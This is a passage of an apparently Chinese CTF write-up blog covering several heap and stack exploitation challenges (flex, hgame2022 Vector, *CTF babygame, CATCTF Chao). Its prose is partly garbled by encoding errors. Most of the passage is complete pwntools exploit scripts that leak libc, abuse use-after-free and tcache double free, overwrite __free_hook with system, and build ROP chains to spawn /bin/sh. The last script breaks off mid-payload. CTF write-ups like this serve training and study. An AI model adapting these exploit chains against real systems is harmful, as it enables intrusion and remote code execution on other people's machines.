class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./flex&#x27;</span>)<br>flag = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> flag:<br>    p = remote(<span class="hljs-string">&#x27;182.92.164.148&#x27;</span>, <span class="hljs-number">48649</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;./flex&quot;</span>)<br>sa = <span class="hljs-keyword">lambda</span> s,n : p.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : p.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : p.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : p.recvuntil(s)<br>ti = <span class="hljs-keyword">lambda</span> : p.interactive()<br>leak = <span class="hljs-keyword">lambda</span> name,addr :log.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(addr))<br><br>pop_rdi = <span class="hljs-number">0x00000000004044d3</span><br>ret = <span class="hljs-number">0x0000000000400ba9</span><br><br>sla(<span class="hljs-string">b&#x27;:\n&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>sla(<span class="hljs-string">b&#x27;)\n&#x27;</span>,<span class="hljs-string">b&#x27;no&#x27;</span>)<br><br>sla(<span class="hljs-string">b&#x27;)\n&#x27;</span>,<span class="hljs-string">b&#x27;yes&#x27;</span>)<br><br>sla(<span class="hljs-string">b&#x27;:\n&#x27;</span>,<span class="hljs-built_in">str</span>(-<span class="hljs-number">2</span>).encode())<br>gdb.attach(p,<span class="hljs-string">&quot;b *0x40134f\nc\n&quot;</span>)<br>paylaod = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x120</span> + p64(<span class="hljs-number">0x6061c0</span>) + p64(<span class="hljs-number">0x401512</span>)<br>sla(<span class="hljs-string">b&#x27;:\n&#x27;</span>,paylaod)<br><br>payload = flat([<br>    <span class="hljs-number">0x4044ca</span>,<br>    <span class="hljs-number">0</span>,<span class="hljs-number">1</span>,elf.got[<span class="hljs-string">&#x27;read&#x27;</span>],<span class="hljs-number">0x100</span>,<span class="hljs-number">0x606260</span>,<span class="hljs-number">0</span>,<br>    <span class="hljs-number">0x4044b0</span>,<br>    <span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span><br>])<br>sla(<span class="hljs-string">b&#x27;:\n&#x27;</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>+p64(ret)+p64(pop_rdi)+p64(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>])+p64(elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>])+payload)<br><br>libc.address = u64(ru(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>leak(<span class="hljs-string">&quot;libc&quot;</span>,libc.address)<br>payload = p64(<span class="hljs-number">0xe3afe</span>+libc.address)<br>sl(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<p>ÁàΩÂïäÔºåÊûúÁÑ∂ËøòÊòØüêçÂá∫Êù•ÊâçÊòØÊúÄÁàΩÁöÑÂïäüòã</p>
<h2 id="hgame2022-Vectorüòé"><a href="#hgame2022-Vectorüòé" class="headerlink" title="hgame2022 Vectorüòé"></a>hgame2022 Vectorüòé</h2><p>Ë∑üvectorÂÆπÂô®ÊúâÂÖ≥ÁöÑ‰∏ÄÈÅìËèúÂçïÂ†Ü</p>
<p>Â§ö‰∫Ü‰∏Ä‰∏™move functionÔºåÈÇ£ÈóÆÈ¢òËÇØÂÆöÂú®ÈáåÈù¢„ÄÇ</p>
<p><img src="/img/C++/12.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>ÂΩìmoveËæìÂÖ•ÁöÑnex_idxËøáÂ§ßÊó∂Ôºåresize‰ºöÁî≥ËØ∑‰∏Ä‰∏™Êõ¥Â§ßÁöÑchunkÔºåÂπ∂ÊääÂéüÊù•chunk‰∏≠ÁöÑÊï∞ÊçÆÂ§çÂà∂ËøáÂéª„ÄÇÂèØ‰ª•ÁúãÂà∞ÔºåËøô‰∏™Êìç‰ΩúÊòØÂú®note[idx]</p>
<p>&#x3D; nullptr‰πãÂâçÔºåÂõ†Ê≠§note[idx] &#x3D; nullptrÂÆûÈôÖ‰∏äÊòØÂú®ÁªôÂ∑≤ÁªèÂ∫üÂºÉÁöÑnote‰∏≠ÁöÑidxÁΩÆ0„ÄÇËøôÊ†∑‰æøËÉΩÈÄ†ÊàêUAF„ÄÇ</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./vector&#x27;</span>)<br>flag = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> flag:<br>    p = remote(<span class="hljs-string">&#x27;182.92.164.148&#x27;</span>, <span class="hljs-number">48649</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;./vector&quot;</span>)<br>sa = <span class="hljs-keyword">lambda</span> s,n : p.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : p.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : p.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : p.recvuntil(s)<br>ti = <span class="hljs-keyword">lambda</span> : p.interactive()<br>leak = <span class="hljs-keyword">lambda</span> name,addr :log.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(addr))<br><br>menu = <span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index,size,content</span>):<br>    sla(menu,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    sla(menu,<span class="hljs-built_in">str</span>(index).encode())<br>    sla(menu,<span class="hljs-built_in">str</span>(size).encode())<br>    sa(menu,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    sla(menu,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    sla(menu,<span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    sla(menu,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    sla(menu,<span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">move</span>(<span class="hljs-params">new_index</span>):<br>    sla(menu,<span class="hljs-string">b&#x27;5&#x27;</span>)<br>    sla(menu,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    sla(menu,<span class="hljs-built_in">str</span>(new_index).encode())<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    add(i,<span class="hljs-number">0x90</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    delete(<span class="hljs-number">7</span>-i)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>    add(i,<span class="hljs-number">0x50</span>,<span class="hljs-string">b&#x27;aaaaaaaa&#x27;</span>)<br><br>show(<span class="hljs-number">0</span>)<br>ru(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)<br>libc.address = u64(rc(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x1ecc70</span><br>leak(<span class="hljs-string">&quot;libc&quot;</span>,libc.address)<br>move(<span class="hljs-number">10</span>)<br>move(<span class="hljs-number">9</span>)<br><br>move(<span class="hljs-number">32</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>,<span class="hljs-number">10</span>):<br>    delete(i)<br><br>delete(<span class="hljs-number">2</span>)<br>delete(<span class="hljs-number">10</span>)<br>delete(<span class="hljs-number">32</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    add(i,<span class="hljs-number">0x50</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br><br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0x50</span>,p64(libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]))<br>add(<span class="hljs-number">8</span>,<span class="hljs-number">0x50</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>add(<span class="hljs-number">9</span>,<span class="hljs-number">0x50</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>add(<span class="hljs-number">10</span>,<span class="hljs-number">0x50</span>,p64(libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]))<br>delete(<span class="hljs-number">8</span>)<br>gdb.attach(p)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="CTF-2021-babygameü§Æ"><a href="#CTF-2021-babygameü§Æ" class="headerlink" title="*CTF 2021 babygameü§Æ"></a>*CTF 2021 babygameü§Æ</h2><p>ÈÄÜ‰∏™üêï8Ôºåüß†Ë¶ÅÁÇ∏‰∫Ü</p>
<p>üë¥‰∏ÄÂºÄÂßãËßâÂæóüë¥Êää9‰∏™ÂÖ≥Âç°ÈÄöÂÖ≥‰∫Üüë¥Â∞±win‰∫ÜÔºå8Â∞±ÊòØÁé©Ê∏∏ÊàèüêéÔºåüë¥Âú®Ë°åÔºåso easy</p>
<p>ÁÑ∂ÂêéÂ∞±Ê≤°ÊúâÁÑ∂Âêé‰∫ÜÔºåüë¥ÂØπÁùÄIDAÈÇ£Âù®Â±éÂ±±‰ª£Á†ÅÁúã‰∫Ü‰∏§‰∏™Â∞èÊó∂Áúã‰∏çÂá∫Êù•Ôºåüë¥ÊëÜ‰∫ÜÔºåÊ∂¶</p>
<p>ÂêéÊù•üë¥ÊÉ≥ÁùÄfuzzËØïËØïÔºåÁªìÊûúËøô‰∏™üêï8glibcÊòØglibc-2.27 ubuntu1.2ÁöÑÁâàÊú¨ÔºåtcacheÈáåËøòËé´ÂæócheckÔºåtcache ÁöÑdouble freeÊ†πÊú¨8‰ºöÊä•ÈîôÔºåÂ¶àÂ¶àÁîüÁöÑ„ÄÇ</p>
<p>üë¥üè≥Ô∏èÔºåÈíªËøõüë¥Âú®‰∏ãÊ∞¥ÈÅìÈò¥ÊöóÁöÑÂ∞èÁ™ùÈáåÁúãA3üë¥ÁöÑwpÔºåüë¥Â•ΩÂ•áA3üë¥ÊòØÊÄé‰πàË∞ÉÂá∫Êù•ÂÆåÊàê‰∏Ä‰∏™ÂÖ≥Âç°ÂêéÔºåÈÄâÂÆö‰∏Ä‰∏™ÂÖ≥Âç°ÔºåÁÑ∂ÂêéÈÄÄÂá∫‰ºöÈÄ†ÊàêUAFÁöÑ„ÄÇ</p>
<p>ÁÑ∂ÂêéÂ∞±ÂæàÁÆÄÂçï‰∫ÜÔºåstringÂèØ‰ª•Áî≥ËØ∑‰ªªÊÑèÂ§ßÂ∞èÁöÑchunkÔºåÈÖçÂêàtcache double free Êâìfree_hook</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br>flag = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> flag:<br>    p = remote(<span class="hljs-string">&#x27;172.10.0.8&#x27;</span>, <span class="hljs-number">9999</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;babygame&quot;</span>)<br>sa = <span class="hljs-keyword">lambda</span> s,n : p.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : p.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : p.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : p.recvuntil(s)<br>ti = <span class="hljs-keyword">lambda</span> : p.interactive()<br>leak = <span class="hljs-keyword">lambda</span> name,addr :log.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(addr))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd</span>(<span class="hljs-params">x</span>):<br>    sla(<span class="hljs-string">b&#x27;:\n&#x27;</span>,x)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode</span>():<br>    cmd(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    cmd(<span class="hljs-string">b&#x27;a&#x27;</span>)<br>    cmd(<span class="hljs-string">b&#x27;a&#x27;</span>)<br>    cmd(<span class="hljs-string">b&#x27;d&#x27;</span>)<br>    cmd(<span class="hljs-string">b&#x27;s&#x27;</span>)<br>    cmd(<span class="hljs-string">b&#x27;s&#x27;</span>)<br>    cmd(<span class="hljs-string">b&#x27;w&#x27;</span>)<br>    cmd(<span class="hljs-string">b&#x27;d&#x27;</span>)<br>    cmd(<span class="hljs-string">b&#x27;d&#x27;</span>)<br>    cmd(<span class="hljs-string">b&#x27;a&#x27;</span>)<br>    cmd(<span class="hljs-string">b&#x27;w&#x27;</span>)<br>    cmd(<span class="hljs-string">b&#x27;w&#x27;</span>)<br><br>cmd(<span class="hljs-string">b&#x27;q&#x27;</span>)<br>cmd(<span class="hljs-string">b&#x27;y&#x27;</span>)<br><br>cmd(<span class="hljs-string">b&#x27;korey0sh1&#x27;</span>)<br><br>cmd(<span class="hljs-string">b&#x27;y&#x27;</span>)<br><br>cmd(<span class="hljs-string">b&#x27;l&#x27;</span>)<br>libc.address = u64(ru(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x3ebca0</span><br>leak(<span class="hljs-string">&quot;libc.address&quot;</span>,libc.address)<br><br>decode()<br>cmd(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>cmd(<span class="hljs-string">b&#x27;q&#x27;</span>)<br>cmd(<span class="hljs-string">b&#x27;n&#x27;</span>)<br>cmd(<span class="hljs-string">b&#x27;y&#x27;</span>)<br><br>cmd(<span class="hljs-string">b&#x27;q&#x27;</span>)<br>cmd(<span class="hljs-string">b&#x27;y&#x27;</span>)<br>cmd(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>*<span class="hljs-number">10</span>)<br>cmd(<span class="hljs-string">b&#x27;y&#x27;</span>)<br><br>cmd(<span class="hljs-string">b&#x27;q&#x27;</span>)<br>cmd(<span class="hljs-string">b&#x27;y&#x27;</span>)<br>cmd(p64(libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>])+<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x48</span>)<br>cmd(<span class="hljs-string">b&#x27;y&#x27;</span>)<br><br>cmd(<span class="hljs-string">b&#x27;q&#x27;</span>)<br>cmd(<span class="hljs-string">b&#x27;y&#x27;</span>)<br>cmd(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>*<span class="hljs-number">10</span>)<br>cmd(<span class="hljs-string">b&#x27;y&#x27;</span>)<br><br>cmd(<span class="hljs-string">b&#x27;q&#x27;</span>)<br>cmd(<span class="hljs-string">b&#x27;y&#x27;</span>)<br><br>cmd(p64(libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>])+<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x48</span>)<br>cmd(<span class="hljs-string">b&#x27;n&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="CATCTF-2022-ChaoüõèÔ∏èüí§"><a href="#CATCTF-2022-ChaoüõèÔ∏èüí§" class="headerlink" title="CATCTF 2022 ChaoüõèÔ∏èüí§"></a>CATCTF 2022 ChaoüõèÔ∏èüí§</h2><p>winmtüë¥Âá∫ÁöÑC++ Pwn</p>
<p>ÈÄÜÂêêÂï¶ü§Æü§Æü§Æü§Æ</p>
<p>CreateÈáåÊúâ0Âíå1‰∏§ÁßçtypeÔºå‰ΩÜËßÇÂØüupdateÂíåshowÂäüËÉΩÂêéÔºåÂ∞±ËÉΩÂèëÁé∞Ëøô‰∏§‰∏™ÂäüËÉΩÂè™ÈÄÇÈÖçtype0„ÄÇÁÑ∂ÂêéÁúãÁúã‰∏§Áßçtype‰∏çÂêåÁöÑËôöË°®ÂáΩÊï∞ÔºåÂ∞±ÂèëÁé∞update type1ËÉΩÁõ¥Êé•‰º™ÈÄ†sizeÂíåshowÁöÑÂü∫ÂùÄÔºå‰æøÂèØ‰ª•‰ªªÊÑèÂú∞ÂùÄËØª„ÄÇ</p>
<p>Â≠òÂú®Ê†àÊ∫¢Âá∫ÊºèÊ¥ûÔºåÁÑ∂ÂêéÁî®0xfffffff7+0xa-1ËøôÁßçË°•Á†ÅÊºèÊ¥ûÊù•Ëß¶ÂèëC++ÂºÇÂ∏∏Â§ÑÁêÜÁªïËøácanary check</p>
<p><img src="/img/C++/13.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;i386&#x27;</span><br><br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br>flag = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> flag:<br>    p = remote(<span class="hljs-string">&#x27;172.10.0.8&#x27;</span>, <span class="hljs-number">9999</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;chao&quot;</span>)<br>sa = <span class="hljs-keyword">lambda</span> s,n : p.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : p.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : p.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : p.recvuntil(s)<br>ti = <span class="hljs-keyword">lambda</span> : p.interactive()<br>leak = <span class="hljs-keyword">lambda</span> name,addr :log.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(addr))<br>menu = <span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params"><span class="hljs-built_in">type</span>,content</span>):<br>    sla(menu,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;?\n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">type</span>).encode())<br>    sla(menu,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br>    sla(menu,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;?\n&#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br>    sla(menu,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    sla(menu,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;?\n&#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br><br>add(<span class="hljs-number">1</span>,p32(<span class="hljs-number">0xdeadbeaf</span>))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    add(<span class="hljs-number">0</span>,<span class="hljs-number">0xf0</span>*<span class="hljs-string">b&#x27;a&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    edit(i+<span class="hljs-number">1</span>,<span class="hljs-number">0x10</span>*<span class="hljs-string">b&#x27;a&#x27;</span>)<br><br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>)<br>add(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">4</span>)<br>edit(<span class="hljs-number">0</span>,p32(<span class="hljs-number">0x11111</span>))<br><br>show(<span class="hljs-number">0</span>)<br><br>ru(<span class="hljs-string">b&#x27;: &#x27;</span>)<br>heap_base = u32(rc(<span class="hljs-number">4</span>)) - <span class="hljs-number">0x5710</span><br><br>libc.address = u32(ru(<span class="hljs-string">b&#x27;\xf7&#x27;</span>)[-<span class="hljs-number">4</span>:]) - <span class="hljs-number">0x1e8780</span><br>leak(<span class="hljs-string">&quot;libc&quot;</span>,libc.address)<br><br>edit(<span class="hljs-number">0</span>,p32(<span class="hljs-number">0xfffffff6</span>)+p32(heap_base+<span class="hljs-number">0x4ba9</span>))<br>show(<span class="hljs-number">0</span>)<br>ru(<span class="hljs-string">b&#x27;: &#x27;</span>)<br>elf_base = u32(rc(<span class="hljs-number">3</span>).rjust(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;\x0c&#x27;</span>)) - <span class="hljs-number">0x4e0c</span><br>leak(<span class="hljs-string">&quot;elf&quot;</span>,elf_base)<br><br>lea_ret =  <span class="hljs-number">0x00110226</span>+libc.address<br>add_esp_1c = <span class="hljs-number">0x0001b034</span> + libc.address<br>ret = libc.address + <span class="hljs-number">0x0001922e</span><br>add_esp_4 = <span class="hljs-number">0x0002fe0e</span> + libc.address<br>add_esp_8 = <span class="hljs-number">0x0002fbe9</span> + libc.address<br>add_esp_c = <span class="hljs-number">0x0001b90a</span> + libc.address<br>int_0x80 = <span class="hljs-number">0x000312f5</span> + libc.address<br>pop_eax = <span class="hljs-number">0x000282eb</span> + libc.address<br>pop_ebx = <span class="hljs-number">0x0001de56</span> + libc.address<br>pop_ecx_edx = <span class="hljs-number">0x00030ea3</span> + libc.address<br>payload = flat([<br>    heap_base+<span class="hljs-number">0x54e8</span>,add_esp_1c,<br>    <span class="hljs-number">0x22222222</span>,<span class="hljs-number">0x33333333</span>,<span class="hljs-number">0x44444444</span>,<span 